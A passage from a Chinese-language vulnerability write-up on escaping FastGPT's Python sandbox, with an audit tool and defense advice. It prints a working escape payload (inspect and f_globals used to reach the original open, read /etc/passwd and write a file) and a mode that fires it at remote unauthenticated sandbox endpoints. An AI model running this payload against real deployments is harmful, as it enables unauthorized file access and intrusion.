| 属性访问 | 枚举危险属性（\__subclasses\_\_ 等），漏一个就破 | 只允许安全属性，其余全拒 |
| 原始引用 | 藏进模块全局（藏不住） | 闭包捕获，模块全局不暴露 |
| 系统调用 | 枚举 40+ 允许项，多一个就破 | 默认全拒，按需放行 |

白名单的本质是把"证明某个东西危险"反转成"证明某个东西安全"——后者在工程上可枚举、可审计。黑名单要回答"还有没有漏的？"这个问题是无解的；白名单只需要回答"列表里的这些够不够用？"，这个问题有明确答案。

那为什么还有人用黑名单？因为白名单难做：真实业务里用户代码要用 datetime、requests（FastGPT 的 SystemHelper 就封装了 HTTP 请求）、os.path 这种半危险模块，白名单得把"安全用法"和"危险用法"区分开，工作量比列黑名单大得多。但安全性和工作量从来都是反比关系——省下的枚举功夫，最后都是要还的。

## 七、工具：fastgpt-sandbox-audit.py

验证过程中我把所有步骤整理成了一个工具，方便复现和检测自己部署的 FastGPT 是否受影响，开源在 [https://github.com/qianlijaingshan/fastgpt-sandbox-audit](https://github.com/qianlijaingshan/fastgpt-sandbox-audit) ：

```plain
python3 fastgpt-sandbox-audit.py --check              # 静态检查 worker.py 防护配置
python3 fastgpt-sandbox-audit.py --exploit            # 跑完整逃逸链（读 /etc/passwd + 写文件）
python3 fastgpt-sandbox-audit.py --dump               # 导出环境变量
python3 fastgpt-sandbox-audit.py --http http://sandbox:3000  # 通过 HTTP API 打远程 sandbox（默认无认证）
python3 fastgpt-sandbox-audit.py --worker /path/to/worker.py  # 指定 worker 路径
```

\--http 模式直接对真实部署的沙箱端点打逃逸链（就是第五章那个无认证的 /sandbox/python），一次验证线上目标是否中招：

### 7.1 用法

\--check 模式会扫描 worker.py，输出风险项：

```plain
=== fastgpt-sandbox-audit: 防护配置检查 ===
[风险] inspect 不在 _DANGEROUS_STDLIB 黑名单 -> 可 import
[风险] AST 检查未拦截 f_globals 属性
[风险] 模块全局暴露 _original_open -> 可被 f_globals 窃取
[风险] 模块全局暴露 _original_import -> 可被 f_globals 窃取
[提示] worker.py 无 seccomp (4.14.8+ 纯 Python 防护)
```

\--exploit 模式对真实 worker.py 跑完整逃逸链：

```plain
=== fastgpt-sandbox-audit: 逃逸链验证 ===
READY: {"type": "ready"}
RESULT: {"success": true, "data": {"codeReturn": "READ: root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys | WRITE: ok", "log": ""}}
```

### 7.2 核心实现

工具核心就一个函数——按 worker 的 stdin JSON 协议发任务：

```plain
def run_payload(code):
    proc = subprocess.Popen(
        [sys.executable, WORKER_PATH],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        text=True
    )
    proc.stdin.write(json.dumps({"type": "init", "allowedModules": [], "requestLimits": {}}) + "\n")
    proc.stdin.flush()
    ready = proc.stdout.readline().strip()
    task = json.dumps({"type": "task", "code": code, "variables": {}, "timeoutMs": 15000})
    proc.stdin.write(task + "\n")
    proc.stdin.flush()
    result = proc.stdout.readline().strip()
    proc.stdin.close()
    return ready, result
```

### 7.3 设计思路：先静态后动态

工具的设计思路是"先静态后动态"：--check 先扫 worker.py 的源码，用正则定位防护配置，判断四个风险点是否存在（inspect 是否在黑名单、AST 是否拦 f_globals、原始引用是否暴露在模块全局）；--exploit 再真跑一次，用实际结果验证静态判断。这样既能快速批量检测（不用真的执行 payload），又能对可疑目标做最终确认。--http 模式是 --exploit 的远程版本——不需要本地有 worker.py，直接对目标沙箱的 /sandbox/python 端点发逃逸链，适合验证线上部署。

\--exploit 模式跑的 payload 就是前面第三节那条链，只是把它包进了 worker 的任务协议里：

```plain
code = """
import inspect
g = inspect.currentframe().f_back.f_globals
f = g['_original_open']('/etc/passwd')
data = f.read()
f.close()
w = g['_original_open']('/tmp/pwned_by_audit.txt', 'w')
w.write('pwned')
w.close()
def main(v):
    return 'READ: ' + data[:120] + ' | WRITE: ok'
"""
```

一条 payload 同时验证读和写：读到 /etc/passwd 开头 120 字符证明读权限，写 /tmp/pwned_by_audit.txt 证明写权限。两个动作一起出结果，比分开测更直观。

### 7.4 检测逻辑

\--check 的检测逻辑其实很直白，就是几个正则：

```plain
# 1. 黑名单是否包含 inspect
m = re.search(r"_DANGEROUS_STDLIB\s*=\s*frozenset\(\{([^}]*)\}", src)
if m and "inspect" not in m.group(1):
    findings.append("[风险] inspect 不在 _DANGEROUS_STDLIB 黑名单")

# 2. AST 检查是否拦截 f_globals
if "f_globals" not in src.split("_validate_user_code")[1][:2000]:
    findings.append("[风险] AST 检查未拦截 f_globals 属性")

# 3. 原始引用是否暴露在模块全局
for ref in ["_original_open", "_original_import"]:
    if re.search(rf"^{ref}\s*=", src, re.M):
        findings.append(f"[风险] 模块全局暴露 {ref}")
```

### 7.5 局限性（诚实说）

工具的检测面是跟着这篇文章的逃逸链走的，不是通用沙箱审计器，有几条边界要说清楚：

1.  \--check 是正则匹配，只能识别已知模式（inspect 是否在黑名单、AST 是否拦 f_globals、原始引用是否在模块全局）。FastGPT 如果后续把原始引用藏进闭包、或者换一种防护结构，正则就测不出来了，需要人工跟进。
2.  \--exploit 需要本地有对应版本的 worker.py（从 FastGPT 官方仓库拉），工具不内置 worker.py——这是故意的，避免工具被拿去对未知目标盲打。
3.  \--check 的输出针对 v4.14.8 的纯 Python 防护设计。对 main 分支，工具会报 Python 层风险，但 main 外面还有 chroot + seccomp 兜底，实际影响被限制在容器内——工具最后那行"\[提示\]"会说明有没有系统层兜底，但最终影响面判断还是要结合部署环境。
4.  工具验证的是"沙箱能不能逃逸"，不包含逃逸后的横向移动利用（连 redis 读数据、调 fastgpt 内部接口这些，要自己写）。

## 八、防御建议

如果你的 FastGPT 用的是 v4.14.8 或更早版本，且暴露了用户工作流（尤其是有多租户或者允许外部用户创建应用），建议按优先级做：

1.  **升级到最新版**。main 分支的 chroot + seccomp 至少能把逃逸限制在容器内。但注意最新版 Python 层防护仍然有同样的问题（inspect 黑名单遗漏在 main 上依然存在），chroot 是兜底不是根治。
2.  **网络隔离**。把 sandbox 容器从 fastgpt 网络里摘出来，单独放一个网络，只允许它访问必要的服务：

```plain
networks:
  fastgpt:
  sandbox-only:   # 独立网络

services:
  sandbox:
    networks: [sandbox-only]
  fastgpt:
    networks: [fastgpt]
```

这样就算逃逸，横向移动的半径也小很多。生产部署里 sandbox 和 mongo/redis 同网是最大的放大器——真实 docker-compose 里 sandbox 和数据库之间没有任何网络 ACL。

1.  **换白名单**。如果要自己写沙箱，模块 import 走白名单（只放 math/json/re 这些纯计算模块），属性访问也走白名单，别用黑名单。FastGPT 的 \_safe_import 其实已经有白名单变量 \_allowed_modules 了，但默认是空的，实际生效的还是"stdlib 放行 + 黑名单拦截"那套。
2.  **别在 Python 层做安全边界**。Python 的 introspection 能力太强（inspect、gc、ctypes 全是现成的武器），单靠语言层防护很难做扎实。真正的隔离应该靠系统层（gVisor、Firecracker、bubblewrap + seccomp），Python 层只做体验限制，不做安全承诺。FastGPT 的 main 分支往这个方向走了（Go native 隔离库），但 Python 层的防护还是原来那套。

## 九、总结

FastGPT 沙箱的防护逻辑是"黑名单 + 藏引用"，这条思路被击穿了两次：一次是 seccomp 白名单漏了 SYS_FCNTL（CVE-2026-32128），一次是模块黑名单漏了 inspect、原始引用没藏好（本文）。两次的根因是同一个—— **黑名单式防护本质不可靠**。

这次审计还有几个具体的收获，按价值排：

1.  **新逃逸链**：inspect → f_back.f_globals → 原始引用。这条链在 v4.14.8 上是完整逃逸（容器内任意文件读写 + 同网络横向移动），在 main 上被 chroot 限制在容器内。已用官方原文件端到端验证 + 官方镜像 HTTP API 实证，不是纸面分析。
2.  **部署模板滞后**：v4.14.8 发布时，官方 compose 的 sandbox 镜像 tag 还指向 seccomp 旧版（v4.14.7.2），v4.14.9 才更新。审计"官方修复"时，不能只看代码 diff，还要看部署模板有没有跟上——代码修了但默认部署方式没换，等于没修。
3.  **版本对比的启示**：v4.14.8 修 CVE 的方式是换防护模型而不是加固原模型，但新模型犯的是同一个错误。审计修复 commit 时，重点看"新模型有没有继承旧模型的缺陷"，而不是只看"旧漏洞还能不能打"。
4.  **Python 沙箱的通用教训**：inspect、gc、ctypes 这些 introspection 模块是 Python 沙箱逃逸的通用武器库，任何"黑名单 + 藏引用"式的 Python 防护都挡不住它们。系统层隔离（chroot/seccomp/独立容器）才是真正的边界。

对用 FastGPT 的人来说，如果你在平台里跑了不信任的 Python 代码（多租户场景、开放注册的应用），你的数据边界可能没有你想的那么硬。对写沙箱的人来说，别在 Python 层跟攻击者玩捉迷藏，你藏不住。
